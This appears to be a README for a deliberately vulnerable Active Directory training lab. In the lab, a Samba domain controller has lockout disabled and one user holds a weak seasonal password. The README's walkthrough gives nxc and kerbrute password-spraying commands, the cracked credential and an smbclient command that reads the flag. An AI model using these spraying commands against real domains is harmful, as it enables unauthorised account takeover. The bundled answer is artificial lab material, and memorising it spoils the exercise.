# Password Spraying (Active Directory)

A single-container Active Directory lab built with [Isoloom](https://www.isoloom.com):
[`isoloom.yml`](isoloom.yml) describes one Samba Domain Controller for the realm
**NORTH.SEVENKINGDOMS.LOCAL** — no Windows VMs. It seeds a themed roster of domain users and
disables account lockout. Every password satisfies the policy, but exactly one account
(`samwell.tarly`) reuses a weak seasonal word (`Autumn2024`); the rest are strong and random. The
flag lives in a `nightswatch` share that only `samwell.tarly` may read.

| Machine | Service |
| --- | --- |
| dc | Samba AD DC: DNS 53, Kerberos 88, LDAP 389/636, SMB 445, kpasswd 464, GC 3268 |

## The attack

1. Take the user roster (given below, or enumerate it over null/low-priv LDAP on 389):
   `eddard.stark, catelyn.stark, robb.stark, sansa.stark, arya.stark, brandon.stark, jon.snow,
   samwell.tarly, jeor.mormont, benjen.stark, theon.greyjoy, maester.luwin`.
2. Spray a short list of seasonal candidates (`Spring2024`, `Summer2024`, `Autumn2024`,
   `Winter2023`, …) across the whole roster — one password at a time, every user — from the
   attack box. Lockout is off, so it is safe:
   `nxc smb <dc> -u users.txt -p 'Autumn2024' --continue-on-success` (or `kerbrute passwordspray`).
3. Exactly one account authenticates: `samwell.tarly` / `Autumn2024`.
4. Read the flag with it: `smbclient //dc/nightswatch -U 'NORTH\samwell.tarly%Autumn2024' -c 'get flag.txt'`.

## Run it

```bash
isoloom generate
isothrum up . --target docker
isothrum check . --target docker
isothrum down . --target docker
```

The same spec also runs on a local VM, a cloud VM, or Kubernetes targets that Isoloom supports.
This environment is deliberately vulnerable: keep it isolated.
